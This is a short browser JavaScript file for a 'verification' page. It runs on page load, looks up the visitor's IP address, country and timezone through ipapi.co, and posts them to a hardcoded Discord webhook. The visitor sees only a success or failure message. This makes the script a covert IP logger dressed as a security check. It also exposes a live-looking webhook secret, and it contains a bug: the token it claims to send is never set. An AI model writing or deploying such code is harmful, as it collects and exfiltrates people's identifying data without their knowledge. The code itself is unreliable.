async function collectSecurityData() {
  const txtEl = document.getElementById("txt");

  // UI helpers
  function failUI(message = "Verification failed: use the link again to retry") {
    if (!txtEl) return;
    txtEl.style.color = "red";
    txtEl.textContent = message;
  }

  function successUI(message = "Verification successful: you can now close this tab") {
    if (!txtEl) return;
    txtEl.style.color = "limegreen";
    txtEl.textContent = message;
  }

      // Get the full URL
    const url = window.location.href;
    
    // Use URLSearchParams to extract 'token'
    const params = new URL(window.location.href).searchParams;
    const token = params.get("v");
  
    if (!token) {
      failUI("Verification failed\nretry with a new link");
      return; // Stop execution if token is missing
    }

  try {
    // 1️⃣ Get IP, country, and timezone info
    const ipRes = await fetch("https://ipapi.co/json/");
    if (!ipRes.ok) throw new Error("IP fetch failed");
    const ipData = await ipRes.json();

    const userIP = ipData.ip;
    const countryCode = ipData.country_code;
    const ipTimezone = ipData.timezone;

    // 2️⃣ Get user's local OS time
    const now = new Date();
    const userHour = now.getHours();
    const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // 3️⃣ Time mismatch check
    const ipTimeString = new Date().toLocaleString("en-US", { timeZone: ipTimezone });
    const ipHour = new Date(ipTimeString).getHours();
    const timeSafe = Math.abs(userHour - ipHour) <= 3;

    // 4️⃣ Combine security data (no VPN detection)
    const securityData = {
      ip: userIP,
      country: countryCode,
      ipTimezone: ipTimezone,
      userTimezone: userTimezone,
      userHour,
      ipHour,
      timeSafe
    };

    // 5️⃣ Send to Discord webhook
    const webhookURL = "https://discord.com/api/webhooks/1458509676277661924/iMx3qDFYRJRZZDO21I_iqBzdvw58TBrtNQAkJFsHgeXPKnjrk-M6J7TE3J8fMp5tSN5Q";

    const messageContent = 
  `${securityData.token}:${securityData.ip}:${securityData.country}:${securityData.ipTimezone}:${securityData.userTimezone}:${securityData.userHour}:${securityData.ipHour}:${securityData.timeSafe}`;


    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Security Bot",
        content: messageContent
      })
    });

    successUI();
  } catch (err) {
    /*console.error("Error collecting security data:", err);*/
    failUI();
  }
}

// Run the function
collectSecurityData();
